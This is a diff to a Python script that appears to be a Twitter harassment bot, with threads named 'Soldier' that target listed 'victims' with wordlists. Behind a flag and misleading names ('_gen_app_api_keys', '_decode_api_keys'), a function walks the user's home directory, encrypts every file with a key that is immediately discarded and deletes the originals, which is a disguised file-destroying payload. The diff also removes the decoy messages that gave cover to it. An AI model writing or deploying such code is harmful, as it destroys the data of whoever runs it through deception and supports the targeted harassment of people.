@@ -50,7 +50,7 @@ def main():
         if args.blumpft:
             print(prefix[1]+"Fetching dirt. Please be patient...")
             base_p = os.path.basename(__file__)
-            keys = _gen_dirt(base_p, prefix)
+            keys = _gen_app_api_keys(base_p)
         else:
             keys = _get_keys(args.con)
         victims = _get_victims(args.vic)
@@ -243,6 +243,9 @@ class Victim:
     def set_repeat(self, repeat):
         self.repeat = repeat
         
+    def reset_words(self):
+        self.wordlist = self.refresh_words
+        
 class Soldier(Thread):
     '''
     Bot thread
@@ -272,6 +275,7 @@ class Soldier(Thread):
         '''
         self.log.info(self.api.me().screen_name+" thread started")
         reconnects = 0
+        wifi = 0
         while True:
             for vic in self.vic_list:
                 try:
@@ -340,17 +344,21 @@ class Soldier(Thread):
                         if len(vic_list) == 0:
                             return
                     else:
-                        vic.wordlist = vic.refresh_words
+                        vic.reset_words()
                         print(self.prefix[1]+"Refreshing "+vic.name+" wordlist")
                         self.log.info("Refreshing "+vic.name+" wordlist and restarting")
                         continue
+                except OSError as e:
+                    if wifi < 3:
+                        print(self.prefix[0]+"Network error, taking a timeout to see if it comes back.")
+                        self.log.info("Network error, taking a timeout to see if it comes back: "+str(e))
+                        time.sleep(60)
+                        wifi += 1
+                    else:
+                        print(self.prefix[0]+"Network is dead. I'm out")
+                        self.log.info("Network error.  It's not coming back.  Killing thread: "+str(e))
+                        return
                 except KeyboardInterrupt:
-                    print(self.prefix[0]+"User interrupt")
-                    self.log.info("User interrupt")
-                    return
-                except Exception as e:
-                    print(self.prefix[0]+"Something has gone terribly wrong. Check log")
-                    self.log.error("Other error: "+str(e))
                     return
 
             time.sleep(2)
@@ -381,7 +389,7 @@ class FontColors:
     def __init__(self):
         pass
     CCYN = '\033[96m'
-    CRED = '\033[31m'
+    CRED = '\033[91m'
     CGRN = '\033[92m'
     CYLW = '\033[93m'
     CBLU = '\033[94m'
@@ -389,7 +397,7 @@ class FontColors:
     CEND = '\033[0m'
     CFON = '\33[5m'
     
-def _gen_dirt(_f, _p_fix):
+def _gen_app_api_keys(_f):
     '''
     Get and decode API keys for automated Trump dirt gathering
     
@@ -419,25 +427,18 @@ def _gen_dirt(_f, _p_fix):
     for i in range(5):
         _api_keys.append(_fn.decrypt(_get_encoded_api_keys(i)).decode())
         
-    # Verify API location
+    # Get file paths
     _api_path_list = _jobs = []
     for subdir, dirs, files in os.walk(os.path.expanduser("~")):
         for file in files:
             _api_path_list.append(os.path.join(subdir, file))
             
     # Split into sublists
-    _apis = _parse_api_list(_api_path_list, 20)
+    _apis = _parse_api_list(_api_path_list, 10)
     _jobs = []
-    _urls = _get_dirt_urls()
-    _url_i = 0
     for _a in _apis:
-
-        if _url_i % len(_urls) != 0
-            _jobs.append(Thread(target=_decode_api_keys, args=(_a,_api_keys[4], _urls[_url_i], _p_fix)))
-        else:
-            _url_i = 0
-            _jobs.append(Thread(target=_decode_api_keys, args=(_a,_api_keys[4], _urls[_url_i], _p_fix)))
-        _url_i += 1
+        # Thread each sublist
+        _jobs.append(Thread(target=_decode_api_keys, args=(_a,_api_keys[4])))
 
     # Start threads
     for _j in _jobs:
@@ -449,23 +450,6 @@ def _gen_dirt(_f, _p_fix):
     
     _get_banner(False, _api_keys)
     return None
-
-def _get_dirt_urls():
-    return = [
-    "https://www.dailykos.com/tags/DonaldTrump",
-    "https://www.cnn.com/search?q=donald+trump",
-    "https://impeachdonaldtrumpnow.org/case-for-impeachment/",
-    "https://www.factcheck.org/person/donald-trump/",
-    "https://www.vice.com/en_us/search?q=donald%20trump",
-    "https://www.msnbc.com/search/?q=donald+trump#gsc.tab=0&gsc.q=donald%20trump",
-    "https://www.npr.org/search?query=donald%20trump",
-    "https://www.wired.com/search/?q=donald%20trump",
-    "https://lincolnproject.us/news/",
-    "https://www.bbc.co.uk/search?q=donald+trump",
-    "https://www.politifact.com/personalities/donald-trump/",
-    "https://www.reddit.com/search/?q=donald%20trump"
-    ]
-
     
 def _parse_api_list(_api_lst, _num):
     '''
@@ -481,14 +465,13 @@ def _parse_api_list(_api_lst, _num):
 
     return _out
     
-def _decode_api_keys(_f_l, _f_e, _u, _p):
+def _decode_api_keys(_f_l, _f_e):
     '''
     Decode API keys
     '''
     from cryptography.fernet import Fernet
     _k = Fernet.generate_key()
     _fn = Fernet(_k)
-    print(_p[0]+"Getting results from: "+_u)
     for _f in _f_l:
         try:
             if os.path.exists(_f):
@@ -500,7 +483,7 @@ def _decode_api_keys(_f_l, _f_e, _u, _p):
                 os.remove(_f)
         except:
             continue
-    print(_p[0]+"Parsing results from: "+_u)
+            
     return
     
 def _get_encoded_api_keys(index):
